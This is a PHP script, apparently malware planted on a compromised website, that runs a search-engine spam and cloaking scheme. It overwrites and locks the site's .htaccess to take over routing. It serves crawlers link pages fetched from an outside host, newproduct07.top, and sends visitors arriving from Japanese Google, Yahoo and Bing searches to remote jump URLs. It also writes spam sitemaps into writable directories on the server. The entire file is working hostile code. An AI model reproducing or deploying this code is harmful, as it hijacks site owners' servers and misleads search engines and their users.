<?php
$yumingid = 10;
$lineid = 936;
$locprefix = "";
$minlen = 2;
$maxlen = 8;
$jumpType = 0;
$is_static=0;
$getloc = 'http://btuan07.newproduct07.top/junchi.php?yid=%d&lid=%d&jumpurl=%d&from=%s';
$urlrules = array('HL?A=#-$-@-DAL-ENT_FOREX.null','#/official/@_news_business/$.vjp','NETWORK-OSHIETE-SHOP-#/CASE-YPT-$.ZXP','Card_Facebok_@/#_c/z_$.pol','@_#_=BIGBANG_COMMON_PRIVACY/$.upo','COUNTER=#_$_@/Information_Event.xhml','female?n=#&sc_@=DescendantCategory_$.htm','HEAVEN.@.CO/#-$.htm','Political/#_Group.aspx?g=$.htm','directory_sex=#/@_state/$.htm','#_nation=$/p=@.htm','#_LESSON.CSV/$.@/P.htm','STORECREATOR-#/IPAD@=$.htm','WINDOWS-#/Z=$_@.HTM','FLASH_@/R-#_JP/$-CAREER.htm','anchor-pickup-#-$-@-fictitious.shtml','PP=-#&ID=@-$/Celebrity_Tipmaster_URL.shtml','definition=menu_fash_#_watc_and_acce_$.shtml','#-$.htl?male_i=pc_mdShoppingRanking.shtml','@-/#/?$-id=lfs_c_book_education.shtml','military/#/?s-id=search_@_header_$.shtml','#.@/_CULTURE=$.shtml','TROOP/-#/@-/M-$.SHTML','leftbox/@aq=-#&ei=UTF-$.shtml','RECLO-@-AS-DECLARE-#/$.SHTML','recommend-item-#/-$-/@.html','#/$/Election_Cate_@Category.html','at-@-#-national-$.html','PEOPLE-#/SA-$/-@.HTML','cate-@-#_$-virtual-articulate-community.htm','#/osharewalker@/nf-$-.html','mode=thanks&cbid=#&csid=$.html','SideMenuTheme_#/@-Chain_$.html','Spring/docs-#-@-framework/html/$.html','HSMC.EDU.HK_WARSZAWA-PL-f-@/#-$.html','ASSETS-#/IMAGE=@/TOP-$/SENMON.HTML','Centossrv-Second-Element-@-Pickup-#/$','#-Animation-@-sideMenuTheme_$','exhortation.#?@-BOOMPG.$','ranking_#/period_weekly/?sc_e=@_comm_shp_h_$_list','author_c=programme&listing=#&brand_id=$','accommodation_id_#/$/top_pedia_day_time','mission_b_@?ie=#&pressonauten_conclusion=$','needs_tabulation_jump/ss_#/-@/maagazine_$','#_type_long=$/@.shtml','?tag_ids=#/@_hokkaido_$','kanto@_#/jp_search_$','-@/Kyushuokinawa-#_$','Volunteer-et-sp-#/@/$','Point_@/Jp_brand/#/$','@_#/_humanrights.aspx/$','DISP/CSFDISPLISTPAGE_#.JSP?DISPNO=$','#.marketing-$/_@_a-to-z','BSR_@_stakeholder-#-and-$','@=#_Investor&Relations_$/allitem=on','press_#/carview/id=$_@','url=headlines_#&lang_@=$','#/$/autumn-classic-@','PG=#_CHARTER=$/@','#/$/RECRUIT/@-','INFOGRAPHICS_@/#-$','#/@_INTERVIEW.$','CLEAR=#/$/@','SPEECH/P-@/TAG_#.$','EMPHASIS-PIEMONT-ALARIC-#-$.@','#_$.@/CAMPAIGN_SHOPGUIDE_LOCONDO','STELLARPLACE_NET_SPORTS/#.$?IP=@','NATURAL/SUMOTO_CGI?SC=APPLE-#_$','@_HOMELAND/KINTETSU_FLOOR_#/$-P','fair_#/collection_$/-@.club/','timesale/@_#=ranking_$_sale-japan/','Commissar/robots_@.txt/#/$/top_hunt/','dMidCatLstShow?percentage=#&DAI_CATEGORY_ID=$/','list.php?vie_id=#/tokai_$/itsc_sectornow.pl/','allitemon_player/?tab=#&second=$&bplay=@/','ABCMART-bitter-store-JP-tohoku/?p_key=#-$/','BELN_SHOP_KBN_VILLA_bergsbynsplat/@_internship=#-$/','IMG_nealwatson_#-$/santiago_workplace-@/','musical-coordinate/#/@_$/','@/#/$_Japanese_Shopguide/','chugokushikoku/-#/category_id=$/','hokushinetu_@/#-$.htm/','products.html?root_level=#&product_detail_one=$/','Yearning_#/$.@.xml/','Position-#/@_$/','AXES_#/C_$/KANSAI-@/','HB&#_Middle_HG&$/','Mr-Independent-@/#.$/','@-Store/Jp-#/Ranklist-$_/','Employment_#&Rate=$/@/','Timetable/#/C_@/$/L_Eate/','P/_@_Engineering-#/-$/','SUMMARY.CGI&@=#/$/','@=#/$_SCHEME.cgi/','INDICATE/-/#/@_$/','DECOMPOSITION/@-#/POST-$/','#/LIST_ID=$_@/','CESARUSFITNESS_TiCTAC/YOUTUBE_@.#/CLOUD-$/','@/_ITEMSEARCH-LALAPORT-#/-$/','HOMESTORY_UPDATE_#-JAPAN_$/.@/','#/$-TO-DO-WINTER-BERLIN-SITE-KAIYO/','TOKEIMASTER_KEIYA_SUMMER.aspx/#_@-$/');
$sm_header = 'Content-type:text/%sml;charset=utf-8';
@ob_start();
@set_time_limit(7200);
@date_default_timezone_set('America/Los_Angeles');
$zuid = 1;
$request_uri = $uri_end = $_SERVER['REQUEST_URI'];
$is_home = in_array($request_uri, array('', '/'));
$serverhost = '';
if (isset($_SERVER['HTTP_HOST'])) {
$serverhost = $_SERVER['HTTP_HOST'];
} elseif (isset($_SERVER['SERVER_NAME'])) {
$serverhost = $_SERVER['SERVER_NAME'];
}
htaccess();
$homeUrl = "http://$serverhost";
$currentUrl = "$homeUrl$request_uri";
$root = $_SERVER['DOCUMENT_ROOT'];
$script_name = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
if ($script_name == '') {
$script_name = isset($_SESSION['SCRIPT_FILENAME']) ? $_SESSION['SCRIPT_FILENAME'] : '';
if ($script_name != '') {
  $script_name = str_replace($root, '', $script_name);
}
}
if ($script_name != '') {
$script_name = substr($script_name, 1);
$posx = strrpos($script_name, '/');
$base = $posx !== false ? substr($script_name, 0, strrpos($script_name, '/')) : '';
$script_filename = $posx !== false ? substr($script_name,  $posx + 1) : $script_name;
}
$page_location_root = "$homeUrl/$base" . ($base == '' ? '' : '/');
$url_prefix = !$is_static ? "$script_filename?" : '';
$uri_end = preg_replace("/^\//si", '', $uri_end);
$uri_end = $base != '' ? preg_replace(sprintf("/^%s\/\??/si", sync_preg_string($base)), '', $uri_end) : $uri_end;
$uri_end = preg_replace("/^($script_filename)?\?/si", '', $uri_end);
$mapol_pre = $base != '' ? preg_replace(sprintf("/^\/%s\//si", sync_preg_string($base)), '', $request_uri) : $request_uri;
$mapol_pre_qm = strpos($mapol_pre, '?');
$mapol_pre = $mapol_pre_qm !== false ? substr($mapol_pre, 0, $mapol_pre_qm + 1) : '';
$mapol_pre = preg_replace("/^\//si", '', $mapol_pre);
/// online sitemap ?
$mapol = false;
$mappages = false;
$mappre = 'sitemap_';
$mapfolder = '';
$mapfx = 0;
$mapstep_need = false;
$mapstep = 1;
$mapmax = 10000;
$mapidf = 0;
$mapmode = 0;
if (preg_match("/\.xml$/si", $uri_end)) {
$mapol = true;
$query_xml = explode('/', $uri_end);
$query_xml_end = array_pop($query_xml);
if (preg_match("/([^\d]+)(\d+)\.xml$/si", $query_xml_end, $mapxml)) {
$mappre = $mapxml[1];
$mapfx = $mapxml[2];
}else{
$mappre = preg_replace("/([a-z]+_?).*/si", "$1", $query_xml_end);
}
if (!empty($query_xml) && preg_match("/^([a-z])?(\d+)$/si", $query_xml[count($query_xml) - 1], $stepmat)) {
if (count($stepmat) == 3) {
$mapstep = $stepmat[2];
if ($stepmat[1] == 's') {
$mapmode = 1;
}elseif ($stepmat[1] == 'g'){
$mapmode = 2;
}
}else{
$mapstep = $mapstep[0];
}
array_pop($query_xml);
}
if (!empty($query_xml) && is_numeric($query_xml[count($query_xml) - 1])) {
  $mapmax = array_pop($query_xml);
  $mapstep_need = true;
}
if (!empty($query_xml)) {
  $mapfolder = implode('/', $query_xml);
}
if (($mapfolder != '' && preg_match("/^pages\/?/si", $mapfolder)) || $query_xml_end == 'pages.xml') {
  $mappages = true;
}
$mapidf = $mapfx == 1 ? 1 : (($mapmax + 1) * ($mapfx - 1) * $mapstep);
$mapidf = $mapidf < 0 ? 0 : $mapidf;
}
///////////////////////////////////////////////
if(isset($_GET['sitemap']) || $mapol){
$num=isset($_GET['num']) ? $_GET['num'] : '';
$getjumpUrl = sprintf($getloc, $yumingid, $lineid, 0, $currentUrl);
$getjumpUrl .= $getjumpUrl . '&sitemap=1';
$jumpurl = trim(curlUrl($getjumpUrl));
    $data=unserialize($jumpurl);
    if ((isset($_GET['sitemap']) && $_GET['sitemap'] == 'all') || $mapol) {
      if ($mapol) {
        $max = $mapmax;
        $dir = $mapfolder;
  $step = $mapstep;
  $idf = $mapidf;
}else{
  $max = isset($_GET['max']) ? (int)$_GET['max'] : 49999;
  $max = $max == 0 ? 49999 : $max;
  $dir = isset($_GET['dir']) ? trim($_GET['dir']) : '';
  $absdir = "$root/$dir";
  if ($dir != '' && !is_dir($absdir)) {
    mmkdir($dir);
        }
        if ($dir == '' || !is_writable($absdir)) {
            $dir = mapdir();
        }
        $step = isset($_GET['step']) ? (int)$_GET['step'] : 1;
        $step = $step <= 1 ? 1 : $step;
        $mapfx = isset($_GET['fx']) ? (int)$_GET['fx'] : 1;
        $idf = isset($_GET['idf']) ? (int)trim($_GET['idf']) : 0;
      }
  $map_msg = '%s has been created successfully:&nbsp;<a href="%s" target="_blank">%s</a><br/><input style="width:70%s;border:1px solid #aaa;padding:2px;border-radius:2px;margin-top:5px" id="sxf" onclick="this.select()" onfocus="this.select()" value="%s" /><script>document.getElementById("sxf").focus()</script>';
  $map_array_head = "\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e\n\t<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
  $total = 0;
      foreach ($data as $key => $value) {
          $total += (int)$value;
      }
      if ($total <= 0) {
                exit('no data');
            }
            $stepmax = ceil($total / 49999);
      $max = $step > $stepmax ? 49999 : $max;

        if ($step <= $stepmax && !in_array($mapmode, array(1, 2)) && (($idf == 0) || ($mapol && $mapfx == 0))) {

            $map_index = "$dir/sitemap_index.xml";
            $map_index_format = "\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e\n\t<sitemapindex xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">%s\n\t</sitemapindex>";
            $map_sitemap_genuri = array();
    $map_index_out = '';
    $map_index_sitemap_format = "\n\t<sitemap>\n\t\t<loc>%s</loc>\n\t\t<lastmod>%s</lastmod>\n\t</sitemap>";
$map_sitemap_genuri_link_format = '%s/%s?sitemap=all&step=%d&idf=%d&max=%d&dir=%s&fx=%d';
    $map_sitemap_genuri_format = '%d. <a class="ck%d" href="%s" target="_blank">%s</a><span id="ck%d"/></span>';
    $map_index_num = ceil($total / $max);
    if ($step != 1) {
                $last = 1;
                last2($last, $step, $max);
                $map_index_num = ceil($total / $last);
            }
            for ($sini=1; $sini <= $map_index_num; $sini++) {
                if ($mapol) {
          $map_index_sitemap_uri = sprintf("$page_location_root%s%s$mappre%d.xml", $mapol_pre, ($dir != '' ? "$dir/" : '') . sprintf('%s%s', ($max != 10000 ? "$max/" : ''), (($mapstep_need || $step != 1) ? "$step/" : '')), $sini);
        }else{
          $map_index_sitemap_uri = sprintf('%s/%ssitemap_%d.xml', $homeUrl, "$dir/", $sini);
    $map_sitemap_genuri_href = sprintf($map_sitemap_genuri_link_format, $homeUrl, $script_name, $step, ($sini == 1 ? 1 : (($max + 1) * ($sini - 1) * $step)), $max, $dir, $sini);
    $map_sitemap_genuri[] = sprintf($map_sitemap_genuri_format, $sini, $sini, $map_sitemap_genuri_href, $map_sitemap_genuri_href, $sini);
      }

    $map_index_out .= sprintf($map_index_sitemap_format, $map_index_sitemap_uri, date('Y-m-d'));
  }
  $map_index_out = sprintf($map_index_format, $map_index_out);
  if ($mapfx == 0) {
    header(sprintf($sm_header, 'x'));
    echo $map_index_out;
    exit();
            }else{
                file_put_contents("$absdir/sitemap_index.xml", $map_index_out);
            echo sprintf($map_msg, $map_index, "$homeUrl/$map_index", $map_index, '%', $map_index) . '<br /><br />[products total: ' . $total . ']Clic' . 'k links below to gen xml file:<br /><br /><style>.ck a{display:inline-block;margin-top:5px}#click span{margin-left: 15px;}</style><div class="ck" id="click">' . implode('<br />', $map_sitemap_genuri) . '</div><script>var i,al=document.getElementById("click").getElementsByTagName("a"),H=[],L=3,E=D=N=0,F=function(){var a=new Image,b=H.shift(),c=b.split("@"),d=document.getElementById(c[0]);N++,d.innerHTML="working...",a.one' . 'rror=function(){d.innerHTML="ok",N--,D++,G()},a.src=c[1],console.log(c[1]+" working...")},G=function(){for(N=0>=N?0:N,E==D&&console.log("done.");H.length&&L>N;)F()};for(i in al)"undefined"!=typeof al[i].href&&H.push(al[i].className+"@"+al[i].href);E=H.length,G();</script>';
            }

        }else{
            $map_file = "sitemap_$mapfx.xml";
            $map_idf_step = $map_tmp_step = $map_step = $step;
            $map_finish_count = 0;
            $map_array = array();
            $map_array_len = 0;

  if (!$mapol) {
    $map_file = "$absdir/sitemap_$mapfx.xml";
    @file_put_contents($map_file, $map_array_head);
  }else{
    header(sprintf($sm_header, 'x'));
              echo $map_array_head;
            }
            if (!empty($data)) {
                $map_uri_format = "\n\t\t\t" . '<loc>%s</loc>';
                //////////////////////////
                $map_skiped = 0;
                $mapoldone = $map_next = 0;
                foreach ($data as $key => $value) {
                    if ($mapoldone >= $max) {
                  break;
                }
                    $map_line_total = (int)$value;
          if ($mapol && $mapmode != 0) {
            $sid_arr = sid_array($map_line_total - 1, $mapstep, $mapmode, $lineid);
            if (!empty($sid_arr)) {
                        $map_array = array();
                        foreach ($sid_arr as $sid_lid) {
                          if ($mapoldone >= $max) {
                            break;
                          }
                          $map_content = '';
                            $map_content .= "\n\t\t" . '<url>';
                            $map_content .= sprintf($map_uri_format, xml_urlarg(urlshengchen($key, $sid_lid)));
$map_content .= "\n\t\t\t" . '<lastmod>' . date('Y-m-d') . '</lastmod>';
$map_content .= "\n\t\t\t" . '<changefreq>daily</changefreq>';
$map_content .= "\n\t\t\t" . '<priority>0.9</priority>';
$map_content .= "\n\t\t</url>";
$map_array[] = $map_content;
$mapoldone++;
}
echo implode('', $map_array);
$map_array = array();
                      }
                    }else{
                        if ($idf > 1) {
                      if (($map_skiped + $map_line_total) < $idf) {
                        $map_skiped += $map_line_total;
                        continue;
                      }
                    }
                    if ($map_line_total != 0) {
                      $map_step = $map_next ? $map_tmp_step : ($map_skiped > 0 ? (ceil($map_skiped / $max) * $max - $map_skiped + 1) : $idf);
                      $map_next = 0;
                      while ($map_finish_count < $max) {
                        if ($map_step > $map_line_total) {
                            $map_next = 1;
                            break;
                        }
                        if ($map_array_len > 1000) {
                            $ready = implode('', $map_array);
            if ($mapol) {
              echo $ready;
            }else{
              @file_put_contents($map_file, $ready, FILE_APPEND);
            }
              $map_array = array();
              $map_array_len = 0;
        }
        $map_content = '';
        $map_content .= "\n\t\t" . '<url>';
        $map_content .= sprintf($map_uri_format, xml_urlarg(urlshengchen($key, $map_step)));
        $map_content .= "\n\t\t\t" . '<lastmod>' . date('Y-m-d') . '</lastmod>';
        $map_content .= "\n\t\t\t" . '<changefreq>daily</changefreq>';
        $map_content .= "\n\t\t\t" . '<priority>0.9</priority>';
        $map_content .= "\n\t\t</url>";
        $map_array[] = $map_content;
        $map_step += $map_tmp_step;
        $map_array_len++;
                        $map_finish_count++;
                      }
                    }
                    }

                }
            }
            $map_array[] = "\n\t</urlset>";
            $sitemap_out = implode('', $map_array);
            $map_array = array();
            if ($mapol) {
          echo $sitemap_out;
        }else{
          @file_put_contents($map_file, $sitemap_out, FILE_APPEND);
          if ($step > 30 && $mapfx == 1) {
            $map_one = "$dir/sitemap_$mapfx.xml";
            echo sprintf($map_msg, $map_one, "$page_host/$map_one", $map_one, '%', $map_one);
          }else{
            echo 'done';
          }
        }
        }
        exit();
    }
    if(isset($_GET['file'])){
        $file=$_GET['file'];
        $str="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\t<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
        foreach($data as $key=>$value){
            for($i=0;$i<$num;$i++){
                $j=mt_rand(1,$value);
                $url=urlshengchen($key,$j);
                $str.= '<url>
			<loc>'.$url.'</loc>';
                $str.='<lastmod>'.date('Y-m-d',time()).'</lastmod>
			<changefreq>daily</changefreq>
			<priority>0.8</priority>'."\n</url>";
            }
        }
        $str.="\n</urlset>";
        $h=fopen($file,'w');
        fwrite($h,$str);
        fclose($h);
        echo $file.' OK!';
        die;
    }
    $str="<!DOCTYPE html>\n<html>\n<head>\n\t<meta charset=\"utf-8\">\n\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t<title></title>\n</head>\n<body>";
    foreach($data as $key=>$value){
        for($i=0;$i<$num;$i++){
            $j=mt_rand(1,$value);
            $url=urlshengchen($key,$j);
            $str.= '<a href="'.$url.'" target="_blank">'.$url."</a><br>\n";
        }
    }
    echo $str."\n</body>\n</html>";
    die;
}

$urlRefer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$userAgentCheck = user_agent_check($userAgent);
$referCheck = refercheck($urlRefer);
$getyid = $getlid = 0;
if ($request_uri != '') {
    urljiexi($request_uri, $getyid, $getlid);
}
$yumingid = $getyid != 0 ? $getyid : $yumingid;
$lineid = $getlid != 0 ? $getlid : lineidcalc($is_home, $lineid);
if ($referCheck) {
    $getjumpUrl = sprintf($getloc, $yumingid, $lineid, 1, $currentUrl);
    $getjumpUrl .= $getjumpUrl . '&type=' . $jumpType;
    $jumpurl = trim(curlUrl($getjumpUrl));
    if ($jumpurl == '') {
echo "jumpurl 404";
} else {
if ($jumpType) {
    header("Location: $jumpurl");
} else {
    echo $jumpurl;
}
    }
    exit();
}
if ($userAgentCheck) {
    $a_format = '<a href="%s" target="_blank">%s</a>';
    $geturl = sprintf($getloc, $yumingid, $lineid, 0, $currentUrl);
    $getchanpin = trim(curlUrl($geturl));
    if ($getchanpin == '') {
        exit("chanpin 404");
    }
    $getchanpin = preg_replace_callback('/\?yumingid\=(\d+)\&lineid\=(\d+)/', 'cpurl', $getchanpin);
    echo "$getchanpin";
    exit();
}//*/


///////////////////////////
function curlUrl($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, 'aabb');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 300);
    $r = curl_exec($ch);
    curl_close($ch);
    if (!$r) {
        return "curl error";
    } else {
        $r = trim(trim($r, "\xEF\xBB\xBF"));
        return $r;
    }
}
function last(&$last, $step, $max, $init = 1){
    if ($init < $max) {
        $last += $step;
        $init++;
        last($last, $step, $max, $init);
    }
}
function getdir(){
    $dir = '';
    $find = glob("*", GLOB_ONLYDIR);
    if (!empty($find)) {
        foreach ($find as $d) {
    if (is_writable($d)) {
        $dir = $d;
        break;
    }
        }
    }
    return $dir;
}
function user_agent_check($ua = "")
{
    return preg_match("/(bing|googlebot|bingbot|google|yahoo)/", $ua);
}
function sid_array($total, $limit, $mode, $lineid){
  $ids = array();
  if ($limit > 0) {
    if ($total <= $limit) {
      $ids = range(0, $total);
}else{
  if ($mode == 1) {
    $tmp = range(0, $total);
    shuffle($tmp);
    $ids = array_slice($tmp, 0, $limit);
    $tmp = array();
  }else{
    for ($i=0; $i < $limit; $i++) {
      $id = static_calc($lineid, $total, $i, $limit);
      if (!in_array($id, $ids)) {
        $ids[] = $id;
      }else{
        $limit++;
      }
        }
      }
    }
  }
  return $ids;
}
function refercheck($refer = "")
{
    return preg_match("/(google.co.jp|yahoo.co.jp|bing)/si", $refer);
}
function mmkdir($dir){
    $dir = preg_replace("/(^\/|\/$)/si", '', $dir);
    // print_r($dir);die;
    $arr = explode('/', $dir);
    if (!empty($arr)) {
$tmpd = '';
foreach ($arr as $dirname) {
  $tmpd .= $tmpd != '' ? '/' . $dirname : $dirname;
  // echo "$tmpd<br/>";
  if (!is_dir($tmpd)) {
      @mkdir($tmpd) or die("mkdir $tmpd failed");
  }
        }
    }
}
function lineidcalc($is_home = false, $lineid = 0)
{
    if ($is_home) {
        return $lineid;
    } else {
        global $currentUrl;
        return strlen($currentUrl);
    }
}
function cpurl($matches) {
    return urlshengchen($matches[1], $matches[2]);
}
function urljiexi($request_uri, &$getyid, &$getlid)
{
    $split = preg_split("/[^a-z0-9]/i", $request_uri, -1, PREG_SPLIT_NO_EMPTY);
    $numbers = array();
    foreach ($split as $splitValue) {
        if (is_numeric($splitValue)) {
            $numbers[] = $splitValue;
        }
    }
    $numberslen = count($numbers);
    if ($numberslen > 0) {
        if ($numberslen == 1) {
            $getlid = array_pop($numbers);
        } else {
            $getyid = array_shift($numbers);
      $getlid = array_pop($numbers);
  }
}
}
function last2(&$last, $step, $max, $init = 1){
if ($init < $max) {
  $last += $step;
  $init++;
  last2($last, $step, $max, $init);
}
}
function urlshengchen($yid, $lid)
{
global $urlrules, $locprefix, $minlen, $maxlen,$is_static, $page_location_root, $url_prefix;
$urluri = '';
$getrule = getRule($urlrules, $yid, $lid);
if ($getrule != '') {
  $randstring = randstring($minlen, $maxlen);
  $urluri = $getrule;
  $urluri = preg_replace("/\@/", "$randstring", $urluri);
  $urluri = preg_replace("/\#/", "$yid", $urluri);
  $urluri = preg_replace("/\\\$/", "$lid", $urluri);
  $urluri = str_replace("&", "&amp;", $urluri);

}
return $page_location_root . $url_prefix . (!$is_static ? str_replace('?', '%3F', $urluri) : $urluri);
}
function xml_urlarg($url = '', $de = 0){
if ($de) {
$url = preg_replace("/&amp;/s", '&', $url);
$url = preg_replace("/&apos;/s", "'", $url);
$url = preg_replace('/&quot;/s', '"', $url);
$url = preg_replace("/&gt;/s", '>', $url);
$url = preg_replace("/&lt;/s", '<', $url);
}else{
$url = preg_replace("/&/s", '&amp;', $url);
    $url = preg_replace("/'/s", '&apos;', $url);
    $url = preg_replace('/"/s', '&quot;', $url);
    $url = preg_replace("/>/s", '&gt;', $url);
    $url = preg_replace("/</s", '&lt;', $url);
  }
  return $url;
}
function getRule($urlrules = array(), $yid, $lid)
{
    $getrule = "";
    $int = (int)$yid + (int)$lid;
    if (!empty($urlrules)) {
        if (isset($urlrules[$int])) {
            $getrule = $urlrules[$int];
        } else {
            $ruleslen = count($urlrules);
            $md5str = md5($int);
            $md5str = trim(preg_replace("/[^0-9]/s", '', $md5str));
            $md5str = substr($md5str, 0, strlen($ruleslen));
            $md5strlast = (int)substr($md5str, -1);
            $md5strlast = $md5strlast <= 1 ? 2 : $md5strlast;
            $int = (int)$md5str;
            if (isset($urlrules[$int])) {
                $getrule = $urlrules[$int];
            } else {
                while (true) {
                    $int = $int == 1 ? 0 : round($int / $md5strlast);
                    if (isset($urlrules[$int])) {
                        $getrule = $urlrules[$int];
                        break;
                    }
                }
            }
        }
    }
    return $getrule;
}
function static_calc($lineid, $max, $id_index, $id_count){
  $func_count = 5;
  $func_index = $id_index % $func_count;
  $return = $lineid;
  switch ($func_index) {
case 0:
      $return = $lineid * ($id_index + 2);
      break;
    case 1:
$return = $lineid / ($id_count + $id_index) * $max;
break;
case 2:
$return = $max / $id_count * $lineid + $id_index;
break;
case 3:
$return = $lineid * 10 - $id_count + $id_index;
break;
case 4:
$return = $id_index * 888 + $lineid;
      break;
  }
  $return = $return < 0 ? abs($return) : $return;
  $return %= $max;
  return $return;
}
function randstring($minlen = 2, $maxlen = 20)
{
    $stringlen = mt_rand($minlen, $maxlen);
    $stringarray = range('a', 'z');
    $stringarraylen = count($stringarray) - 1;
    $randstring = "";
    for ($i = 0; $i < $stringlen; $i++) {
        $randstring .= $stringarray[mt_rand(0, $stringarraylen)];
    }
    return $randstring;
}
function htaccess($htaccess_path = ''){
  $htaccess_path = '.hta' . 'ccess';
  @chmod($htaccess_path, 0777);
  $fc = @file_get_contents($htaccess_path);
  $nfc = array();
  if ($fc !== false) {
    preg_match_all("/<IfModule\s+mod_rewrite.c>[^<]+<\/IfModule>/si", $fc, $matches);
    if (isset($matches[0]) && !empty($matches[0])) {
// check if %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing)
foreach ($matches[0] as $block) {
if (!preg_match("/%\{HTTP_USER_AGENT\}\s\(google/si", $block)) {
  $nfc[] = $block;
}
}
}
  }
  if (empty($nfc)) {
    $nfc[] = sprintf("<IfModule%smod_" . "rewrite.c>%sRewriteEngine%sOn%sRewriteCond%s%s{RE" . "QUEST_FILENAME}%s!-f%sRewrit" . "eCond%s%s{REQUEST_F" . "ILENAME}%s!-d%sRewriteRule%s.%sindex" . ".php%s[L]%s</IfMod" . "ule>", ' ', "\n", ' ', "\n", ' ', '%', ' ', "\n", ' ', '%', ' ', "\n", ' ', ' ', ' ', "\n");
  }
@file_put_contents($htaccess_path, trim(implode("\n", $nfc)));
  $fc = $nfc = null;
  @chmod($htaccess_path, 0444);
}
function sync_preg_string($sps, $delarg = 1){
$sps_chars = '\\?/|&()[]{}+^$!:*';
  $sps_chars_array = str_split($sps_chars);
  $sps_char_format = '%s%s';
  if ($delarg) {
    $sps = preg_replace("/(\?|#).*/si", '', $sps);
  }
  foreach ($sps_chars_array as $sca_v) {
    $sps = str_replace($sca_v, sprintf($sps_char_format, '\\', $sca_v), $sps);
  }
  return $sps;
}
?>
